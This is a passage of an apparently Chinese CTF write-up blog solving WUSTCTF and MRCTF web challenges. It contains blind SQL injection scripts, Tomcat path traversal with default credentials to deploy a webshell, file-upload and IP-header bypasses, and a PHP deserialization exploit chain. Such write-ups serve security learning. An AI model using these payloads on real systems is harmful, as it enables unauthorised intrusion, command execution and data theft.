class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``.&#123;&#125;-"</span>:</span><br><span class="line">        payload = <span class="string">"if(ascii(substr((select(group_concat(value))from(flag)),"</span>+str(i)+<span class="string">",1))="</span> + str(ord(str1)) + <span class="string">",1,2)"</span></span><br><span class="line">        payload = urllib.parse.quote(payload)</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'admin'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=str1</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><del>有道1解题貌似很顶就没有看。</del></p><h2 id="Train-Yourself-To-Be-Godly"><a href="#Train-Yourself-To-Be-Godly" class="headerlink" title="Train Yourself To Be Godly"></a>Train Yourself To Be Godly</h2><p>到buu上复现了。仔细做会发现还是细节上问题比较多。<br>首先是分析。因为题目显示的页面是tomcat默认的<code>/examples</code>路由。那么说明是用examples做的根目录<br><a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</a><br>然后是这个文档。<br>可以构造路径穿越，来到其他路径下。比如此处为了getshell,进入<code>/manager</code>构造<code>/..;/manager</code><br>之后一个tomcat:tomcat的弱口令。<br>具体getshell流程可以参考vulhub上tomcat/tomcat8的漏洞Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞。[<a href="https://github.com/vulhub/vulhub/blob/master/tomcat/tomcat8]" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/tomcat/tomcat8]</a><br>(<a href="https://github.com/vulhub/vulhub/blob/master/tomcat/tomcat8)我也简单复现了下，可以去我的vulhub复现文章那看。" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/tomcat/tomcat8)我也简单复现了下，可以去我的vulhub复现文章那看。</a><br>先给出webshell.jsp与webshell.war的生成方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                 </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>带回显与密码的jsp，比较好用。<br>然后命令行可以生成war<br><code>jar cvf webshell.war webshell.jsp</code><br>貌似直接压缩jsp成zip然后改后缀为war也可以。<br>进入后自然是上传war包了。但是很快发现点击上传后返回404。而它的路径给的是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;examples&#x2F;..;&#x2F;manager&#x2F;html&#x2F;upload?org.apache.catalina.filters.CSRF_NONCE&#x3D;A226F07F06C2C983EE2911A5963BFA84</span><br></pre></td></tr></table></figure><p>看来是又从根目录开始加载路径了，这个用同样的方法，将路径改成<br><code>/..;/manager/html/upload......</code>即可<br>不过很快会发现401。未授权访问。如果熟悉tomcat的很快能反应过来是少了header里的认证，当然在成功访问后台时抓包也能看到自己的header中有认证头。<br><code>Authorization: Basic dG9tY2F0OnRvbWNhdA==</code><br>后面就是tomcat:tomcat的base64编码。这里显然因为我们是通过构造路径穿越的问题，没有在upload时自动带上。<br>那么继续上传，发现403.只能是cookie的问题了。回头去看访问<code>/..;/manager/html</code>时就存在set-cookie的返回。那么只能是缺cookie了。<br>具体做法：重新访问一遍<code>/..;/manager/html</code>从返回头取一个cookie.然后上传时抓包拦截，把认证跟cookie以及访问地址全部改好，直到200为止。<br><img src="/2020/03/29/WUSTCTF&MRCTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/8.PNG" alt><br>然后就可以访问webshell进行命令执行了。这里flag比赛是在根目录的文章中，buu是在根目录.<br><code>/..;/webshell/exp.jsp?pwd=023&amp;i=cat%20/flagggg</code></p><h1 id="MRCTF"><a href="#MRCTF" class="headerlink" title="MRCTF"></a>MRCTF</h1><p>天璇的比赛相对WUST就难一点，然而还是一堆套娃。心里苦。套娃题多真的是CTF比赛怪现状了,脱离了CTF的本质…</p><h2 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h2><p>老套娃了。方法都老套了。<br>第一步一个MD5碰撞，网上一堆现成的。<br>第二步一个isnumeric()，只需要在数字后随便加个符号就可以绕过</p><h2 id="你传你🐎呢"><a href="#你传你🐎呢" class="headerlink" title="你传你🐎呢"></a>你传你🐎呢</h2><p>文件上传基本套路，试了下发现php可解析的几个后缀都没了。那试试<code>.htaccess</code>发现可以。那就没事了，绕文件检查上传jpg图片马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addtype application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure><h2 id="PYwebsite"><a href="#PYwebsite" class="headerlink" title="PYwebsite"></a>PYwebsite</h2><p>我承认这题是我自己菜了。<br>开始前端一个验证MD5，但是是个js。我还跑去搜js的MD5弱类型，发现好像就没有这个trick啊…</p><p>后来才注意flag.php说他记录了所有购买者ip<br>所以<code>X-Forwarded-For:127.0.0.1</code>访问即可</p><h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><p>先是要绕第一层，但是怎么看着就像我们nctf的题呢？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">'%5f'</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Y0u are So cutE!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">'b_u_p_t'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'b_u_p_t'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span></span><br></pre></td></tr></table></figure><p>使用<code>b.u.p.t</code>替代，以及在23333后加上%0a绕过preg_match()</p><p>第二层<br>首先一堆jsfuck，扔Chrome控制台得到一个提示post Merak,传个值得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接着老套娃了。<br>首先是<code>getIp()</code>函数，去官网查了下，是header可控。那就header设置为<code>Client-IP:127.0.0.1</code><br>然后为了<code>file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39;</code>这步老方法使用data协议<br><code>data://text/plain,todat is a happy day</code><br>最后一个file先用上面给的函数改改编码下即可。</p><h2 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h2><p>pop链构造,实话说三个类的pop很基础，不过我开始觉得这个起点贼诡异。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目标自然是include flag.php了。不过最好直接伪协议读。</p><p>首先要触发<code>__toString</code>那就先来个echo。也就是说还得再来个Show类对象置为它的source属性,echo时触发.Show类带Show类,讲究。</p><p>之后<code>$this-&gt;str-&gt;source</code>明显可以触发Test的<code>__get()</code>，然后返回值是函数，那就可以触发Modifer的<code>__invoke()</code>了。</p><p>很简单的链子，就是第一步自己开始犯傻以为__toString()触发是echo时自动就有的，想了半天确认应该还是得对象echo才会触发。这点不能混淆。<br>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> Show();</span><br><span class="line">$b=<span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source=$b;</span><br><span class="line">$b-&gt;str=<span class="keyword">new</span> Test();</span><br><span class="line">$b-&gt;str-&gt;p=<span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="keyword">echo</span>(urlencode(serialize($a)));</span><br></pre></td></tr></table></figure><h2 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h2><p>提示audit那就看看源码泄露。发现<a href="http://www.zip，结果上来就只有一个index.php,还以为有很多源码" target="_blank" rel="noopener">www.zip，结果上来就只有一个index.php,还以为有很多源码</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html; charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">'Private_key'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">''</span>) || ($password == <span class="string">''</span>) ||($Private_key == <span class="string">''</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">'*************'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br></pre></td></tr></table></figure><p>只要绕过一个私钥即可sql注入。<br>那么注意到公,私钥是通过mt_rand()生成的，那就好说。直接./mt_r走起<br>先将公钥转为脚本可识别的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span></span><br><span class="line">str2=<span class="string">'KVQP0LdJKRaV3n9D'</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><p>然后设定好随机数种子，按先公钥,再私钥的顺序生成。得到私钥<code>XuNhoueCDCGc</code><br>直接sql注入即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://aa90a604-c5bb-44d9-8589-b9614155f505.merak-ctf.site/login.php'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> str1 <span class="keyword">in</span> <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``.&#123;&#125;-"</span>:</span><br><span class="line">        payload = <span class="string">"1' or if(ascii(substr(flag,"</span>+str(i)+<span class="string">",1))="</span>+str(ord(str1))+<span class="string">",sleep(3),1)#"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">'admin'</span>,</span><br><span class="line">            <span class="string">'password'</span>: payload,</span><br><span class="line">            <span class="string">'Private_key'</span>: <span class="string">'XuNhoueCDCGc'</span>,</span><br><span class="line">            <span class="string">'login'</span>: <span class="string">'1'</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += str1</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>打开kali+爆破种子花了10多分钟，前几血又没了。心里苦。<br>事后仔细一看sql语句已经写好了，所以只要万能密码就行了。难怪手速慢，该打。</p><h2 id="Ezpop-revenge"><a href="#Ezpop-revenge" class="headerlink" title="Ezpop_revenge"></a>Ezpop_revenge</h2><p>打算写wp就是为了这题。质量绝对够。<br>开始下载<a href="http://www.zip的源码,然后发现是typeEcho的模板，之前没审过这个模板相关的pop链,上去找了下还挺有意思。" target="_blank" rel="noopener">www.zip的源码,然后发现是typeEcho的模板，之前没审过这个模板相关的pop链,上去找了下还挺有意思。</a><br>跟zjy师傅审出了入口+利用点就懒得写poc了。不过还是得动手做做才行。（毕竟实际写起来多半直接拉胯）</p><p>首先是终结点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">   $_SESSION[<span class="string">'flag'</span>]= <span class="string">"MRCTF&#123;******&#125;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"我扌your problem?\n</span></span><br><span class="line"><span class="string">only localhost can get flag!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>显然是要ssrf。而且这里让我莫名想到了之前LCTF的bestphp’srevenge.就是通过Soap打ssrf的一个trick.<br>然后找入口了。<br>这里难受的是phpstorm全局搜索找不到unserialize。还是zjy师傅帮我找到的.原来是插件里面手写的一个类<br>主体函数大概这么多</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">"MRCTF&#123;this_is_a_fake_flag&#125;"</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">'hello'</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">'world'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span 